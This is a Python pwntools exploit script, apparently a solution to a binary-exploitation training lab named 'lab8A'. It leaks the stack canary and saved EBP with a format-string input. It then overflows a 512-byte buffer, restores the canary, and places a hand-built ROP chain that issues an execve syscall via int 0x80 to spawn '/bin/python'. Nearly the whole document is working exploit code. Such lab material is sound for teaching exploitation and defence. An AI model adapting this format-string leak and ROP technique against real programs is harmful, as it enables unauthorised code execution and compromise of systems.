from pwn import *
settings = {
    "binary"        : "/tmp/lab8A",
}
def exploit():
    print("PID: "+str(pidof(p)))
    pause()
    p.sendlineafter("Enter Your Favorite Author's Last Name: ","%130$p-%131$p")
    leak=str(p.recvline()).split("-")
    canary=leak[0]
    EBP=leak[1]
    print("Canary: "+canary)
    print("EBP: "+EBP)
	
    canary_value = int(canary,16)
    EBP_value = int(EBP,16)
    
    python_addr = EBP_value + 884 	# based on leaked EBP, calculate the address of the "/bin/python" string
    print("/bin/python address: %x" % python_addr)

    # Binary is statically compiled, we don't need to leak the code segment.
    ROP = ""

	# EDX = 0
    ROP = ROP + p32(0x80554f0)	# xor eax eax ;;
    ROP = ROP + p32(0x80aa955) # xchg edx eax ;;	 

    # EAX = 0xb without using a nullbyte in the string
    ROP = ROP + p32(0x80554f0) # xor eax eax ;; -> EAX = 0
    # followed by 11 "inc eax" instructions
    ROP = ROP + p32(0x80ea08b) # inc eax ;; 
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;
    ROP = ROP + p32(0x80ea08b) # inc eax ;;

    # ECX = 0
    ROP = ROP + p32(0x80e71c5) # pop ecx ;;
    ROP = ROP + p32(0xffffffff)# ECX = 0xffffffff
    ROP = ROP + p32(0x80dcbf4) # inc ecx ;; // overflow ECX to 0

    # EBX = "/bin/python"
    ROP = ROP + p32(0x804fb14) # pop ebx ;;
    ROP = ROP + p32(python_addr) #	// the address of /bin/python - just in case use the dynamically calculated one instead of this sample fixed one

	# INT 0x80
    ROP = ROP + p32(0x806f8ff) # int 0x80

    payload = "A"*512	# overflow the buf[512] in the second selectABook() call, overwrite the canary with itself and put the ROP in place
    payload = payload + p32(canary) + p32(EBP) + ROP + p8(0x0)
    p.sendafter("What were you thinking, that isn't a good book.",payload)
	# Send "A" to convince the third call of selectABook() to call readA() and return instead of calling itself again (prevent further recurrence).
    p.sendafter("What were you thinking, that isn't a good book.","A")

    return 0
# Initial setup
if __name__  == "__main__":
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path,stdin=PTY)
    exploit()
